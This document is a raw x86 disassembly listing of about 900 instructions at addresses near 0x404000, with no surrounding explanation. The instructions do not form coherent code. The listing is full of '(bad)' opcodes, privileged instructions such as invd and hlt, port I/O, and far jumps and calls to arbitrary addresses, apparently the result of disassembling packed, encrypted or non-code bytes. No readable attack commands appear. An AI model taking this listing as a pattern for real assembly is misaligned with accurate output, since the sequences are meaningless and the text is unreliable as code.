  403ed7:	gs (bad) 
  403ed9:	nop
  403eda:	cwde   
  403edb:	scas   eax,DWORD PTR es:[edi]
  403edc:	cwde   
  403edd:	xchg   eax,ebp
  403edf:	mov    edi,0x53450e02
  403ee4:	je     0x403f47
  403ee6:	arpl   WORD PTR [ebx+0x1],bp
  403ee9:	nop
  403eea:	hlt    
  403eeb:	mov    eax,0xb768b902
  403ef0:	hlt    
  403ef1:	or     DWORD PTR ds:0xdf74361b,edx
  403ef7:	je     0x403ecd
  403ef9:	ins    BYTE PTR es:[edi],dx
  403efa:	inc    ebx
  403efb:	(bad)  
  403efc:	dec    esp
  403efd:	addr16 (bad) 
  403eff:	cld    
  403f00:	adc    DWORD PTR [eax+0x56674c13],0x61697261
  403f0a:	outs   dx,BYTE PTR ds:[esi]
  403f0b:	add    bh,BYTE PTR [ecx-0x48577c98]
  403f11:	test   al,0x8b
  403f13:	xchg   DWORD PTR [edx-0x4f],esp
  403f16:	mov    cs,WORD PTR [eax-0x12ec7dbc]
  403f1c:	(bad)
  403f1f:	popa   
  403f20:	fsub   QWORD PTR [esi+ecx*4+0x8]
  403f24:	push   0x9a8a08bf
  403f29:	sub    DWORD PTR [eax-0x4f9df198],edx
  403f2f:	jb     0x403f8d
  403f31:	mov    ah,0x13
  403f33:	sbb    ah,ah
  403f35:	jns    0x403ec7
  403f37:	fs mov bh,0x64
  403f3a:	dec    esi
  403f3b:	adc    eax,0x66568418
  403f40:	jo     0x403f0a
  403f42:	jae    0x403ed5
  403f44:	fdiv   QWORD PTR [edi-0x3cef3f40]
  403f4a:	sub    eax,eax
  403f4c:	add    eax,0xab534608
  403f51:	push   ds
  403f52:	add    al,0x72
  403f54:	mov    ds:0x676918e0,al
  403f59:	sbb    BYTE PTR [ecx+0x4d],ch
  403f5c:	repnz push edi
  403f5e:	popa   
  403f5f:	mov    ss,WORD PTR [ebx+0x61]
  403f62:	data16 arpl WORD PTR gs:[ecx+0x6c],sp
  403f67:	xor    BYTE PTR [eax-0x65],dh
  403f6a:	adc    bh,bh
  403f6c:	jle    0x403f7f
  403f6e:	add    ebp,DWORD PTR [esi]
  403f70:	aaa    
  403f71:	xor    al,0x4
  403f73:	pop    ebp
  403f74:	dec    eax
  403f75:	invd   
  403f77:	and    ah,BYTE PTR [ecx+0x2b]
  403f7a:	add    al,0x3e
  403f7c:	push   ebp
  403f7d:	inc    esp
  403f7e:	ins    BYTE PTR es:[edi],dx
  403f7f:	jae    0x403fbf
  403f81:	add    eax,0x47664810
  403f86:	cmp    BYTE PTR [esi],ch
  403f88:	mov    ds:0x1c03940,al
  403f8d:	mov    esi,0xaa766724
  403f92:	adc    ebx,ebp
  403f94:	aas    
  403f95:	inc    esp
  403f96:	xchg   edi,eax
  403f97:	mov    eax,0x391406b6
  403f9c:	add    bh,bh
  403f9e:	adc    edx,DWORD PTR [esp+edx*2+0x68]
  403fa2:	jb     0x404009
  403fa4:	popa   
  403fa5:	fs inc esp
  403fa8:	jne    0x404018
  403faa:	mov    esi,ecx
  403fac:	pop    es
  403fad:	push   es
  403fae:	int3   
  403faf:	add    eax,0xffffffd4
  403fb2:	test   BYTE PTR [edx+0x479c0f2c],ch
  403fb8:	add    BYTE PTR [edi],ah
  403fba:	inc    edi
  403fbb:	test   eax,0x789edc30
  403fc0:	sbb    DWORD PTR [eax+edx*4-0x2c],esp
  403fc4:	aam    0xd4
  403fc6:	add    DWORD PTR [edx-0x62],ebp
  403fc9:	out    0xf3,al
  403fcb:	sbb    al,0xbe
  403fcd:	push   es
  403fce:	adc    eax,0xf1e969e1
  403fd3:	(bad)  
  403fd4:	mov    edi,0x87f979c1
  403fd9:	push   edx
  403fda:	mov    WORD PTR [eax],ss
  403fdc:	jnp    0x403f6d
  403fde:	sbb    eax,0xdf9c4cdb
  403fe3:	push   edi
  403fe4:	loopne 0x404057
  403fe6:	sbb    DWORD PTR [edi+ebp*1+0x44],esi
  403fea:	out    dx,eax
  403feb:	cmp    eax,0x2c4e203f
  403ff0:	mov    edi,0x63c16
  403ff5:	sub    ch,BYTE PTR [edi+0x44]
  403ff8:	push   DWORD PTR [esi]
  403ffa:	xor    BYTE PTR [ecx],dl
  403ffc:	stc    
  403ffd:	xchg   BYTE PTR [edi],al
  403fff:	lea    esi,[edi+0x247cb8a8]
  404005:	push   esp
  404006:	dec    ebp
  404007:	jne    0x404075
  404009:	(bad)  
  40400b:	lds    esp,FWORD PTR [eax+0x6c20bc52]
  404011:	jne    0x404086
  404013:	call   0xb082977d
  404018:	inc    ecx
  404019:	pusha  
  40401a:	fadd   st,st(2)
  40401c:	lods   al,BYTE PTR ds:[esi]
  40401d:	outs   dx,BYTE PTR ds:[esi]
  40401e:	arpl   dx,bp
  404020:	inc    esp
  404021:	cs inc eax
  404023:	mov    al,0x3a
  404025:	imul   edi,DWORD PTR [edx-0x28],0xfc05ddaf
  40402c:	int    0x34
  40402e:	ret    0xeac1
  404031:	adc    BYTE PTR [esi-0x9],ah
  404034:	repz dec eax
  404036:	mov    WORD PTR [ecx],ax
  404039:	or     BYTE PTR ds:[edi],ch
  40403c:	mov    al,ds:0x811f1304
  404041:	popa   
  404042:	sar    BYTE PTR [edi],0xb7
  404045:	scas   al,BYTE PTR es:[edi]
  404046:	push   cs
  404047:	retf   
  404048:	mov    dl,0x1
  40404a:	mov    eax,ds:0x859b8e38
  40404f:	dec    edi
  404050:	mov    ds:0xe026930a,eax
  404055:	mov    bh,0x3f
  404057:	mov    BYTE PTR [ebx+0x42],dl
  40405a:	xor    DWORD PTR [ecx],ebx
  40405c:	nop
  40405d:	shl    BYTE PTR [ebx],1
  40405f:	leave  
  404060:	sbb    ecx,DWORD PTR [ecx-0x2c743d71]
  404066:	daa    
  404067:	(bad)  
  404068:	das    
  404069:	add    esp,eax
  40406b:	sbb    al,BYTE PTR [ebx]
  40406d:	aas    
  40406e:	cli    
  40406f:	cmp    ebx,esi
  404071:	xor    eax,0xd8e30215
  404076:	test   DWORD PTR [eax+eax*2-0x4f],esp
  40407a:	(bad)  
  40407b:	rol    BYTE PTR [edi],cl
  40407d:	jbe    0x4040a7
  40407f:	and    ecx,esi
  404081:	mov    ebx,0x8abc9d04
  404086:	cli    
  404087:	push   ds
  404088:	push   es
  404089:	cmp    al,0x7a
  40408b:	ja     0x40408f
  40408d:	sub    al,0x9c
  40408f:	mov    edi,edx
  404091:	mov    cl,0xd8
  404093:	add    al,0x88
  404095:	add    bh,bh
  404097:	xchg   esp,eax
  404098:	ds in  al,dx
  40409a:	adc    ebx,DWORD PTR [eax+0x28]
  40409d:	lock jne 0x40407f
  4040a0:	aad    0x9f
  4040a2:	test   BYTE PTR [edi+ecx*8],dh
  4040a5:	inc    ebp
  4040a6:	inc    ecx
  4040a7:	pop    edx
  4040a8:	add    al,0x2c
  4040aa:	pop    esp
  4040ab:	adc    DWORD PTR [ebp-0x64],ebp
  4040ae:	push   ebx
  4040af:	push   esi
  4040b0:	or     DWORD PTR [eax+0x5f88aff],ecx
  4040b6:	or     esi,eax
  4040b8:	push   edx
  4040b9:	cld    
  4040ba:	mov    ecx,eax
  4040bc:	cmp    ecx,edx
  4040be:	jbe    0x40413b
  4040c0:	xchg   edx,eax
  4040c1:	(bad)  
  4040c2:	mov    ebx,0xf3c93904
  4040c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040c8:	je     0x4040f4
  4040ca:	mov    bl,BYTE PTR [esi-0x1]
  4040cd:	adc    al,0x8
  4040cf:	or     dl,dl
  4040d1:	ds dec ecx
  4040d3:	add    dh,BYTE PTR [edx]
  4040d5:	push   ds
  4040d6:	mov    bh,BYTE PTR [edi+0x1e]
  4040d9:	call   eax
  4040db:	fstp   TBYTE PTR [edi-0x5b]
  4040de:	(bad)  
  4040df:	out    dx,eax
  4040e0:	and    BYTE PTR [eax],bh
  4040e2:	sti    
  4040e3:	je     0x4040bd
  4040e5:	movzx  eax,bl
  4040e8:	add    al,0xd7
  4040ea:	sub    eax,edx
  4040ec:	pop    ebx
  4040ed:	out    dx,eax
  4040ee:	push   ebp
  4040ef:	adc    ebp,eax
  4040f1:	stos   BYTE PTR es:[edi],al
  4040f2:	nop
  4040f3:	lock sbb DWORD PTR [eax-0x1aeb65e9],esp
  4040fa:	add    al,0x36
  4040fc:	or     ah,BYTE PTR [edx+0x10aa4a3b]
  404102:	add    dh,BYTE PTR [eax]
  404104:	fwait
  404105:	mov    esp,0x5d06cc5b
  40410a:	loopne 0x40409c
  40410c:	enter  0xb157,0x87
  404110:	push   eax
  404111:	and    dh,BYTE PTR [edi-0x1bf01ff1]
  404117:	ret    
  404118:	pop    ds
  404119:	ret    
  40411a:	jmp    0x18c6:0x8010a40d
  404121:	dec    edx
  404122:	cs pusha 
  404124:	or     DWORD PTR [edx],0x38
  404127:	add    bl,BYTE PTR [esi+0x6f]
  40412a:	add    eax,esi
  40412c:	mov    ch,0xb4
  40412e:	inc    eax
  40412f:	pop    ecx
  404130:	pop    esp
  404131:	jl     0x4040f6
  404133:	add    al,0x60
  404135:	and    eax,0x4fc09498
  40413a:	jmp    0xa28b:0x868674a5
  404141:	(bad)  
  404142:	fwait
  404143:	lock mov ebx,0xfede32dd
  404149:	mov    edi,0xf33b4301
  40414e:	jl     0x404157
  404150:	cmp    BYTE PTR [edi+ebx*1-0x1],0x20
  404155:	jbe    0x40414b
  404157:	adc    al,0x7d
  404159:	or     cl,BYTE PTR [ebx-0x2c243c3b]
  40415f:	lods   eax,DWORD PTR ds:[esi]
  404161:	pop    ss
  404162:	dec    esi
  404163:	sub    BYTE PTR [edi],dh
  404165:	clc    
  404166:	push   0xffffffce
  404168:	sub    ecx,ebx
  40416a:	inc    ecx
  40416b:	repnz xchg ecx,eax
  40416d:	inc    edx
  40416e:	add    BYTE PTR [edi],bh
  404170:	jno    0x4041a3
  404172:	mov    WORD PTR [edi],?
  404174:	retf   0xb07b
  404177:	inc    ecx
  404178:	cmp    DWORD PTR [edx+0x1e927ed8],edx
  40417e:	fpatan 
  404180:	xchg   esp,eax
  404181:	push   ds
  404182:	mov    ds,WORD PTR [ebp-0x3fe897c3]
  404188:	sbb    edi,DWORD PTR [esi+0x75c90867]
  40418e:	push   esi
  40418f:	sar    BYTE PTR [ecx+0xe],0xf7
  404193:	xchg   esp,eax
  404194:	pop    ebp
  404195:	fistp  QWORD PTR [esi-0x4f99002d]
  40419b:	sub    eax,0x6884e41
  4041a0:	ret    
  4041a1:	mov    ecx,0x31565d0a
  4041a6:	shl    bh,cl
  4041a8:	icebp  
  4041a9:	out    0xc2,al
  4041ab:	xor    BYTE PTR [eax-0x5f75c506],al
  4041b1:	pop    ss
  4041b2:	dec    edx
  4041b3:	sbb    al,dl
  4041b5:	pop    es
  4041b6:	mov    BYTE PTR [esi],dl
  4041b8:	cmp    al,0xea
  4041ba:	(bad)  
  4041bc:	jmp    FWORD PTR [ebx]
  4041be:	js     0x4041e9
  4041c0:	icebp  
  4041c1:	sub    edx,ecx
  4041c3:	jbe    0x4041d5
  4041c5:	add    ecx,edx
  4041c7:	mov    al,0x30
  4041c9:	sub    esi,edx
  4041cb:	jmp    0x4041d0
  4041cd:	mov    BYTE PTR [edx+esi*1],al
  4041d0:	dec    edx
  4041d1:	jne    0x4041cd
  4041d3:	push   0x56
  4041d5:	mov    DWORD PTR [ecx],edx
  4041d7:	lock into 
  4041d9:	(bad)  
  4041da:	out    0x83,al
  4041dc:	in     al,dx
  4041dd:	adc    BYTE PTR [ecx],dh
  4041df:	leave  
  4041e0:	push   edx
  4041e1:	outs   dx,BYTE PTR ds:[esi]
  4041e2:	cdq    
  4041e3:	push   eax
  4041e4:	mov    edx,esi
  4041e6:	pop    eax
  4041e7:	retf   
  4041e8:	hlt    
  4041e9:	outs   dx,BYTE PTR ds:[esi]
  4041ea:	fst    QWORD PTR [edx+eax*8-0x4ccf28a2]
  4041f1:	jmp    FWORD PTR ds:0x2bf80300
  4041f7:	and    bh,bh
  4041f9:	jo     0x4041ff
  4041fb:	push   DWORD PTR [eax]
  4041fd:	mov    eax,esp
  4041ff:	test   DWORD PTR [eax-0xa],0x46745970
  404206:	sbb    DWORD PTR cs:[ecx+0x73a433bf],esp
  40420d:	lock mov BYTE PTR [esi-0x1],0x2d
  404212:	dec    esi
  404213:	inc    ecx
  404214:	dec    esi
  404215:	pop    ebp
  404216:	cmp    bh,0x9b
  404219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40421a:	mov    ds:0x247cd904,al
  40421f:	add    bl,cl
  404221:	cmp    al,0x24
  404223:	or     WORD PTR [edx+ecx*1],0xd90f
  404229:	sub    al,0xec
  40422b:	fsub   DWORD PTR gs:[esi-0x172676f0]
  404232:	mov    DWORD PTR [edi],esp
  404234:	and    DWORD PTR [esp+esi*2-0x49],0x5401ec3f
  40423c:	jg     0x4042a6
  40423e:	or     edi,edi
  404240:	fild   QWORD PTR [esp+0x8]
  404244:	fistp  WORD PTR [eax-0x28]
  404247:	ret    0xdcde
  40424a:	mov    esi,0xc183fd
  40424f:	jmp    0x404253
  404251:	fild   QWORD PTR [eax]
  404253:	fild   WORD PTR [esp+ebp*2]
  404256:	ror    DWORD PTR [esi-0x27],0xf8
  40425a:	(bad)  
  40425c:	fdiv   st(1),st
  40425e:	mov    al,BYTE PTR [eax+0x24]
  404261:	pop    eax
  404262:	sub    eax,0xae3c3036
  404267:	adc    ch,BYTE PTR ds:[edx-0x1]
  40426b:	lods   eax,DWORD PTR ds:[esi]
  40426c:	lods   al,BYTE PTR ds:[esi]
  40426d:	push   es
  40426e:	sub    al,0xd8
  404270:	rcr    DWORD PTR [ebx+0x739ee0df],cl
  404276:	loope  0x404251
  404278:	push   0x2
  40427a:	fstp   DWORD PTR [eax+eiz*8-0x3c22f141]
  404281:	ffree  st(2)
  404283:	ffree  st(1)
  404285:	ffree  st(0)
  404287:	pop    ecx
  404288:	aad    0x29
  40428a:	(bad)  
  40428b:	add    ecx,edx
  40428d:	repz pusha 
  40428f:	add    eax,0x20dd462c
  404294:	xchg   edx,eax
  404295:	push   es
  404296:	pop    ss
  404297:	push   eax
  404298:	push   eax
  404299:	pop    esi
  40429a:	or     bl,ah
  40429c:	mov    esp,0x78829686
  4042a1:	and    BYTE PTR [esi+0x5d],bl
  4042a4:	mov    esp,0xcce0787e
  4042a9:	sbb    dh,ah
  4042ab:	add    al,BYTE PTR [eax+0x57]
  4042ae:	push   ecx
  4042af:	mov    ecx,0xe5c49754
  4042b4:	bound  esi,QWORD PTR [edi]
  4042b6:	and    BYTE PTR [ebx-0x34],dl
  4042b9:	aam    0xe1
  4042bb:	and    DWORD PTR [eax+0x1],ebx
  4042be:	jno    0x404245
  4042c0:	stc    
  4042c1:	xor    DWORD PTR [ebp+0x25],edx
  4042c4:	sahf   
  4042c5:	pop    edx
  4042c6:	(bad)  
  4042c7:	push   ecx
  4042c8:	jns    0x40429e
  4042ca:	sar    DWORD PTR [edx-0x48],0x9f
  4042ce:	cmp    DWORD PTR [ecx+0x3d803d06],ecx
  4042d4:	or     BYTE PTR [edi-0x7f5e5862],ah
  4042da:	addr16 push eax
  4042dc:	js     0x404321
  4042de:	ret    0x1c75
  4042e1:	shr    BYTE PTR [ecx],0xf6
  4042e4:	mov    eax,0xbf83691f
  4042e9:	cmp    al,BYTE PTR [eax]
  4042eb:	inc    edx
  4042ec:	imul   esp,DWORD PTR [edi+0x3a],0xb172a0ac
  4042f3:	jg     0x404374
  4042f5:	dec    edi
  4042f6:	mov    edx,0x2c236f8c
  4042fb:	cld    
  4042fc:	mov    eax,ds:0x90846d84
  404301:	retf   0x4c80
  404304:	push   eax
  404305:	test   BYTE PTR [eax+ecx*2-0x48b92865],bl
  40430c:	add    al,0x54
  40430e:	jb     0x404292
  404310:	sti    
  404311:	sar    DWORD PTR [ebp-0x21],cl
  404314:	pop    ds
  404315:	add    eax,0x736c6146
  40431a:	and    DWORD PTR [eax],ebx
  40431c:	cld    
  40431d:	not    bh
  40431f:	xchg   edi,eax
  404320:	push   edi
  404321:	mov    BYTE PTR [ebp-0x1],0x92
  404325:	repnz test esi,esi
  404328:	jl     0x40434a
  40432a:	inc    esi
  40432b:	js     0x4042e0
  40432d:	or     bh,BYTE PTR [eax+0x65]
  404330:	cmp    bh,BYTE PTR [esi+0x5cac138b]
  404336:	mov    ah,0xb2
  404338:	or     eax,0x3a065f8c
  40433d:	add    ebx,ebp
  40433f:	push   es
  404340:	in     eax,0xe3
  404342:	mov    dl,BYTE PTR [esi]
  404344:	lds    edx,FWORD PTR [edi+eax*4-0x1828ebd0]
  40434b:	lahf   
  40434c:	rcr    ch,0xc0
  40434f:	fiadd  DWORD PTR [ebp+ecx*4+0x55]
  404353:	lock pop es
  404355:	cld    
  404356:	cmp    esp,DWORD PTR [esi+eiz*4-0x4f2fc390]
  40435d:	adc    ebx,ebx
  40435f:	ins    DWORD PTR es:[edi],dx
  404360:	lock fcomp DWORD PTR ds:0xbf047060
  404367:	mov    edi,0xf4c1010
  40436c:	xchg   ebp,eax
  40436d:	add    ebp,ebx
  40436f:	dec    ecx
  404370:	ss pop edi
  404372:	adc    BYTE PTR [ebp-0x1],dl
  404375:	in     eax,dx
  404376:	out    dx,eax
  404377:	popa   
  404378:	ins    DWORD PTR es:[edi],dx
  404379:	retf   0x17d0
  40437c:	pop    edi
  40437d:	mov    al,ds:0xc6056759
  404382:	add    ecx,esp
  404384:	and    DWORD PTR [esi+0x42],esp
  404387:	imul   eax,DWORD PTR cs:[esp+eax*4-0x7c],0x97de103
  404390:	add    eax,0x17fc24e
  404395:	retf   0x6e7c
  404398:	pop    ss
  404399:	fbstp  TBYTE PTR [eax]
  40439b:	pop    ss
  40439c:	add    ch,BYTE PTR ds:0x7bc40531
  4043a2:	out    0x86,al
  4043a4:	icebp  
  4043a5:	bound  ebp,QWORD PTR [edi+ebp*8]
  4043a8:	adc    DWORD PTR cs:[esi-0x28],edi
  4043ac:	push   ebp
  4043ad:	add    dh,BYTE PTR [ebp+edx*1-0x1d]
  4043b1:	mov    edx,DWORD PTR [edx]
  4043b3:	aaa    
  4043b4:	jmp    0x4043da
  4043b6:	adc    eax,0x21e92458
  4043bb:	test   BYTE PTR [eax+0x28],al
  4043be:	rol    BYTE PTR [ecx],cl
  4043c0:	mov    esp,0x4c8aaaf7
  4043c5:	adc    al,0x95
  4043c7:	sub    al,0x51
  4043c9:	in     eax,dx
  4043ca:	sub    DWORD PTR [edi-0x3],edx
  4043cd:	jmp    FWORD PTR [ecx-0x377c07f9]
  4043d3:	dec    DWORD PTR [ebx+0x3e683f3]
  4043d9:	cmp    esi,0x2
  4043dc:	ja     0x40441d
  4043de:	cwde   
  4043df:	and    edx,0xdd7893f0
  4043e5:	jno    0x4043bd
  4043e7:	pop    esi
  4043e8:	inc    eax
  4043e9:	ja     0x40441d
  4043eb:	hlt    
  4043ec:	sbb    ah,0x9a
  4043ef:	cli    
  4043f0:	add    BYTE PTR [edx+0x3],ch
  4043f3:	push   0x6
  4043f5:	sub    eax,0xef7b65d7
  4043fa:	and    BYTE PTR [ebx-0x75bf7afc],cl
  404400:	push   eax
  404401:	push   cs
  404402:	mov    ch,0x34
  404404:	(bad)  
  404405:	fild   WORD PTR [eax]
  404407:	sub    ecx,ebx
  404409:	sub    edx,ecx
  40440b:	xor    DWORD PTR [eax],0x16
  40440e:	xchg   BYTE PTR [ebp+0x10273ae],ch
  404414:	dec    ebx
  404415:	arpl   bp,cx
  404417:	xchg   BYTE PTR [esi],bh
  404419:	or     BYTE PTR [ebp+0x77],0xfa
  40441d:	rcr    BYTE PTR [edi],0x44
  404420:	popa   
  404421:	pop    es
  404422:	push   edi
  404423:	push   ecx
  404424:	sar    DWORD PTR [eax],0x27
  404427:	xchg   esp,eax
  404428:	add    dl,bl
  40442a:	into   
  40442b:	inc    ebp
  40442c:	and    eax,0x1f7b029d
  404431:	pop    es
  404432:	(bad)  
  404433:	push   esp
  404434:	add    BYTE PTR [ebp+0x72ee60bc],dl
  40443a:	mov    cl,0x57
  40443c:	dec    ebx
  40443d:	or     ch,dl
  40443f:	push   esp
  404440:	or     ch,BYTE PTR [ecx+0x7008cab7]
  404446:	xchg   esp,eax
  404447:	sub    cl,BYTE PTR cs:[esi+ebx*4]
  40444b:	push   esi
  40444c:	cwde   
  40444d:	out    0xa6,al
  40444f:	mov    esi,0xf0cbd4b1
  404454:	stc    
  404455:	push   ebp
  404456:	ins    BYTE PTR es:[edi],dx
  404457:	jo     0x404453
  404459:	mov    ds:0x493f5291,al
  40445e:	clc    
  40445f:	inc    ebx
  404460:	sbb    dh,al
  404462:	inc    ecx
  404463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404464:	retf   
  404465:	dec    edx
  404466:	cld    
  404467:	pop    es
  404468:	mov    BYTE PTR [edx],0x7f
  40446b:	cld    
  40446c:	(bad)  
  40446d:	jle    0x404498
  40446f:	mov    bl,BYTE PTR [esi+edi*1-0x1]
  404473:	cli    
  404474:	push   ecx
  404475:	xor    BYTE PTR [esi+esi*8],bh
  404478:	sbb    al,0x5c
  40447a:	and    eax,0xffb65c64
  40447f:	xlat   BYTE PTR ds:[ebx]
  404480:	inc    edx
  404481:	(bad)  
  404482:	xlat   BYTE PTR ds:[ebx]
  404483:	pop    ebp
  404484:	call   0x4f06:0x75023ce4
  40448b:	dec    edi
  40448c:	push   eax
  40448d:	jg     0x404466
  40448f:	(bad)  
  404490:	ds in  al,0x20
  404493:	mov    ch,0xd7
  404495:	cli    
  404496:	pushf  
  404497:	sar    DWORD PTR [eax-0x6ea88d98],cl
  40449d:	(bad)
  4044a2:	mov    esi,eax
  4044a4:	push   edi
  4044a5:	cmp    al,0xb9
  4044a7:	push   ecx
  4044a8:	pop    edi
  4044a9:	lds    eax,FWORD PTR [ebx]
  4044ab:	sahf   
  4044ac:	mov    ecx,0x3a5cdf17
  4044b1:	add    al,al
  4044b3:	mov    cl,0x87
  4044b5:	add    DWORD PTR [edi+0x6fb0b8d6],edx
  4044bb:	fmul   DWORD PTR [eax+ebx*4]
  4044be:	std    
  4044bf:	imul   ebx,DWORD PTR [edx+0x11752e18],0x9bd37f57
  4044c9:	jmp    0xec23b32a
  4044ce:	pop    es
  4044cf:	not    DWORD PTR [ebp+0x6c1a038f]
  4044d5:	and    ch,dh
  4044d7:	cs nop
  4044d9:	xlat   BYTE PTR ds:[ebx]
  4044da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044db:	push   esp
  4044dc:	loop   0x404503
  4044de:	mov    esp,0x68500c32
  4044e3:	scas   al,BYTE PTR es:[edi]
  4044e4:	add    DWORD PTR [ebx],ebp
  4044e6:	jecxz  0x404469
  4044e8:	sub    esp,DWORD PTR [eax-0x75]
  4044eb:	enter  0x490f,0x6c
  4044ef:	and    bh,BYTE PTR [esi+0x6461bd25]
  4044f5:	sbb    al,0x46
  4044f7:	xlat   BYTE PTR ds:[ebx]
  4044f8:	mov    edx,es
  4044fa:	push   es
  4044fb:	pop    edx
  4044fc:	adc    ch,BYTE PTR [ebx+0x76]
  4044ff:	sbb    esp,esp
  404501:	int    0xb0
  404503:	push   ebx
  404504:	stos   BYTE PTR es:[edi],al
  404505:	test   BYTE PTR [eax-0x29],dl
  404508:	lods   eax,DWORD PTR ds:[esi]
  404509:	in     al,0xfd
  40450b:	mov    ds:0x5891f0ee,al
  404510:	in     eax,0xfc
  404512:	imul   DWORD PTR [ebp+0x16]
  404515:	inc    ebp
  404516:	call   0x652d0d22
  40451b:	mov    dh,0x48
  40451d:	adc    al,0x8c
  40451f:	mov    edx,0xe8891fe2
  404524:	aad    0x38
  404526:	lods   al,BYTE PTR ds:[esi]
  404527:	mov    ecx,DWORD PTR [ebp+0x18]
  40452a:	add    DWORD PTR [ecx-0x25c6efaf],ecx
  404530:	leave  
  404531:	xor    edx,DWORD PTR fs:[eax]
  404534:	lea    edx,[ebx-0x80]
  404537:	aaa    
  404538:	push   ds
  404539:	jbe    0x40454b
  40453b:	mov    ebx,0x30aa0d8d
  404540:	(bad)  
  404541:	int    0xff
  404543:	xor    ch,BYTE PTR [esi+0x1712feb8]
  404549:	or     eax,0xc829107f
  40454e:	mov    edi,edx
  404550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404551:	push   ecx
  404552:	sbb    BYTE PTR [edx+0x3d29e1ea],dl
  404558:	popf   
  404559:	mov    bh,0x1c
  40455b:	push   ecx
  40455c:	dec    eax
  40455d:	pop    eax
  40455e:	das    
  40455f:	fxch   st(3)
  404561:	dec    esi
  404562:	add    BYTE PTR ds:0xa57fbd29,0x6c
  404569:	add    DWORD PTR [ecx+0x29],eax
  40456c:	retf   
  40456d:	mov    edi,esi
  40456f:	mov    esi,edx
  404571:	sbb    cl,0x94
  404574:	xchg   esp,eax
  404575:	cs dec edx
  404577:	scas   al,BYTE PTR es:[edi]
  404578:	repnz fld DWORD PTR [ecx+edx*1+0x5bb0af19]
  404580:	pop    esi
  404581:	pop    edi
  404582:	ret    
  404583:	scas   eax,DWORD PTR es:[edi]
  404584:	jge    0x4045c1
  404586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404587:	les    edi,FWORD PTR [ecx-0x14]
  40458a:	(bad)  
  40458b:	pop    ecx
  40458c:	adc    ah,BYTE PTR [ebx-0x6c]
  40458f:	cmp    al,0x7b
  404591:	dec    eax
  404592:	sub    al,0x71
  404594:	movsx  edi,BYTE PTR [eax+0x7d005fc6]
  40459b:	push   ds
  40459c:	adc    esi,DWORD PTR [ecx]
  40459e:	not    ecx
  4045a0:	rcl    dl,cl
  4045a2:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045a4:	mov    al,BYTE PTR [esi-0x7f]
  4045a7:	jmp    0x404557
  4045a9:	loopne 0x4045aa
  4045ab:	mov    dl,BYTE PTR [edi+0x24]
  4045ae:	shl    BYTE PTR [eax+0x6495347],1
  4045b4:	into   
  4045b5:	push   cs
  4045b6:	dec    esp
  4045b7:	jae    0x4045ea
  4045b9:	ror    BYTE PTR [ecx],0x2f
  4045bc:	add    cl,bl
  4045be:	dec    edi
  4045bf:	je     0x4045e2
  4045c1:	pop    ss
  4045c2:	mov    esi,0xbb52e211
  4045c7:	data16 cmp dl,0x84
  4045cb:	xchg   esi,eax
  4045cc:	or     al,0xb6
  4045ce:	iret   
  4045cf:	cli    
  4045d0:	jmp    0x729:0xdb748020
  4045d7:	add    ch,BYTE PTR [esi+0x78]
  4045da:	pop    esi
  4045db:	int3   
  4045dc:	add    al,0xeb
  4045de:	or     al,0x84
  4045e0:	rol    DWORD PTR [esi+esi*8],0xef
  4045e4:	push   0x12
  4045e6:	or     dl,BYTE PTR [edx]
  4045e8:	mov    eax,DWORD PTR [ecx]
  4045ea:	mov    al,BYTE PTR [eax]
  4045ec:	cmp    dl,al
  4045ee:	jne    0x4045dc
  4045f0:	push   cs
  4045f1:	iret   
  4045f2:	(bad)  
  4045f3:	push   edx
  4045f4:	rol    DWORD PTR [ebp+0x6e4044b4],cl
  4045fa:	sti    
  4045fb:	sbb    ebx,DWORD PTR [eax+ecx*1]
  4045fe:	fisub  DWORD PTR ds:0x2e744921
  404604:	mov    esi,ecx
  404606:	mov    edi,ebx
  404608:	pop    ds
  404609:	prefetch BYTE PTR [edi+0x76f1291f]
  404610:	sbb    eax,0xff5e8d1c
  404615:	add    al,0xac
  404617:	sbb    al,0x11
  404619:	std    
  40461a:	lds    eax,FWORD PTR [esi+0x57c889e0]
  404620:	sbb    cl,BYTE PTR [eax-0x128a3e77]
  404626:	lea    eax,[edi-0x1]
  404629:	xor    al,BYTE PTR [esi+0xf4a0061]
  40462f:	mov    edx,DWORD PTR [esi]
  404631:	adc    ebp,DWORD PTR [ecx]
  404633:	xor    DWORD PTR [ebx+ecx*4],esp
  404636:	sbb    al,al
  404638:	add    al,0xa
  40463a:	jo     0x4045e2
  40463c:	pushf  
  40463d:	fild   QWORD PTR [ecx+0x577e1a3f]
  404643:	fistp  WORD PTR ds:0x5a6c633b
  404649:	inc    esi
  40464a:	inc    edi
  40464b:	fs es sbb eax,0xce480d1c
  404652:	lock dec ebx
  404654:	test   BYTE PTR [ebp+0x12],dh
  404657:	jo     0x40467e
  404659:	aaa    
  40465a:	fsubr  st,st(2)
  40465c:	cld    
  40465d:	jnp    0x4045e0
  40465f:	push   DWORD PTR [eax+0x5761ffb]
  404665:	mov    ebx,0x4ad3981f
  40466a:	gs fwait
  40466c:	or     BYTE PTR [ecx+eax*1],bh
  40466f:	mov    edi,0x28570062
  404674:	dec    ebx
  404675:	mov    eax,esp
  404677:	nop
  404678:	(bad)  
  404679:	jae    0x404641
  40467b:	add    al,0x47
  40467d:	fisttp DWORD PTR [edx-0x4c]
  404680:	sbb    al,0x3a
  404682:	les    esp,FWORD PTR [eax+0x20]
  404685:	mov    BYTE PTR [esi],0x24
  404688:	push   es
  404689:	add    BYTE PTR [eax],ah
  40468b:	ins    DWORD PTR es:[edi],dx
  40468c:	dec    esp
  40468d:	pushf  
  40468e:	pop    ebp
  40468f:	mov    al,0xbd
  404691:	push   esp
  404692:	sti    
  404693:	pop    edx
  404694:	call   0xab3edac8
  404699:	call   0x583c:0xd8bf728
  4046a0:	xor    al,0x39
  4046a2:	add    BYTE PTR [esp+ecx*1+0x61],dh
  4046a6:	xchg   ecx,eax
  4046a7:	icebp  
  4046a8:	fisttp QWORD PTR [ebx+0x1b8b151d]
  4046ae:	call   ebx
  4046b0:	pop    ebx
  4046b1:	not    DWORD PTR [ebp-0x5d]
  4046b4:	arpl   WORD PTR [edi+ebp*8+0xd],di
  4046b8:	cli    
  4046b9:	(bad)  
  4046ba:	cmp    bl,BYTE PTR [edx]
